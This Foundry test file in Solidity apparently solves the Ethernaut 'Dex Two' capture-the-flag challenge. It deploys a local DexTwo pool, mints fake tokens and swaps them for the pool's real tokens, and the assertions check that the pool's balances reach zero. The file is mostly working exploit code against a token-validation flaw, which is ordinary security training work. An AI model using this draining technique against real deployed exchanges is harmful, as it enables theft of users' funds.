pragma solidity ^0.8;

import {Test,console} from "forge-std/Test.sol";
import {DexTwo, MyToken,SwappableTokenTwo} from "../src/dex2.sol";

contract HackEthernautDexTwo is Test {
    DexTwo private _dex_two;
    SwappableTokenTwo private token1;
    SwappableTokenTwo private token2;
// the fake tokens i created to swap with the dex tokens
    MyToken public myToken1;
    MyToken public myToken2;

    // _dex = IDex(address(Dex));
    // token1 = IERC20(MyToken());
    function setUp() public {
        deal(address(this), 1 ether);
        
        _dex_two = new DexTwo();
        token1 = new SwappableTokenTwo(address(_dex_two), "token1","TK1",100);//deploy and mint 10 units of this token
        token2 = new SwappableTokenTwo(address(_dex_two), "token2","TK2",100);

        token1.approve(address(_dex_two), 100);
        token2.approve(address(_dex_two), 100);
       //send token 1 and token2 to the dex
       _dex_two.add_liquidity(address(token1), 100);
       _dex_two.add_liquidity(address(token2), 100);

        // set the dex tokens
        _dex_two.setTokens(address(token1),address(token2));

        // deploy the fake tokens
        myToken1 = new MyToken();
        myToken2 = new MyToken();
        // mint the fake tokens
        myToken1.mint(2);
        myToken2.mint(2);

        // send 1unit each to the dex
        myToken1.transfer(address(_dex_two),1);
        myToken2.transfer(address(_dex_two),1);

        //approve dex to spend the fake tokens 
        myToken1.approve(address(_dex_two), 1);
        myToken2.approve(address(_dex_two), 1);

    }

    function testDex2Drain() public{
        // do swaps repeatedly...
        _dex_two.swap(
            address(myToken1),
           address(token1),
           1
        );
         _dex_two.swap(
           address(myToken2),
             address(token2),
            1
        );
        
        uint T1dexBalAfterSwap =  token1.balanceOf(address(_dex_two));
        uint T2dexBalAfterSwap =  token2.balanceOf(address(_dex_two));

        console.log("balance after exploit==>",T1dexBalAfterSwap);
        assertEq(T1dexBalAfterSwap,0);
        assertEq(T2dexBalAfterSwap,0);
    }


}